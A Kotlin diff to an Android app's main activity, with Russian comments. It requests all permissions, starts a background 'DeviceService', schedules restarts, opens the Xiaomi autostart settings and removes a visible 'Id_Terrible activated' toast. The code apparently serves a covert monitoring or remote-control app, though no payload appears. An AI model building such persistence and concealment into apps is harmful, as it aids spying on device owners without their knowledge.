@@ -27,17 +27,18 @@ class MainActivity : Activity() {
             SecurityManager.activateLicense()
         }
         
-        requestAllPermissions()
         scheduleRestart()
         
+        // СНАЧАЛА запроси разрешения
+        requestAllPermissions()
+        
+        // ПОТОМ запусти сервис
         val serviceIntent = Intent(this, DeviceService::class.java)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(serviceIntent)
         } else {
             startService(serviceIntent)
         }
-        
-        Toast.makeText(this, "Id_Terrible activated", Toast.LENGTH_SHORT).show()
         
         finish()
     }
@@ -97,6 +98,15 @@ class MainActivity : Activity() {
                     data = Uri.parse("package:$packageName")
                 })
             }
+        } catch (_: Exception) {}
+        
+        try {
+            val intent = Intent()
+            intent.component = android.content.ComponentName(
+                "com.miui.securitycenter",
+                "com.miui.permcenter.autostart.AutoStartManagementActivity"
+            )
+            startActivity(intent)
         } catch (_: Exception) {}
     }
     
